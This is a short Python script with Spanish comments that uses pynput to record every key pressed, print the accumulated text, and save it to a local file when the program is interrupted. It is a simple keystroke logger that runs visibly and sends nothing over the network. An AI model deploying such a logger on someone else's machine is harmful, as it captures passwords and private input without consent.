# -*- coding: utf-8 -*-
from pynput import keyboard
#variable global dónde almacenamos el texto tecleado
texto_presionado = ""

#almacenamos la tecla pulsada.
def on_press(key):
    global texto_presionado
    try:
        texto_presionado = texto_presionado + '{0}'.format(
            key.char)
        print('{0}'.format(
            key.char))
        print(texto_presionado)
    except AttributeError:
        texto_presionado = texto_presionado + '{0}'.format(
            key)
        print(texto_presionado)
        print('{0}'.format(
            key))
#bucle que se encarga de recibir las teclas pulsadas
try:
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
    ) as listener:
        listener.join()
    # ...or, in a non-blocking fashion:
    listener = keyboard.Listener(
        on_press=on_press)
    listener.start()
#excepción paara cundo termina el programa.
except KeyboardInterrupt:
    text_file = open("teclas_presionadas", "w")
    #almacenamos la información en un fichero.
    text_file.write(texto_presionado)
    #cerramos el fichero.
    text_file.close()
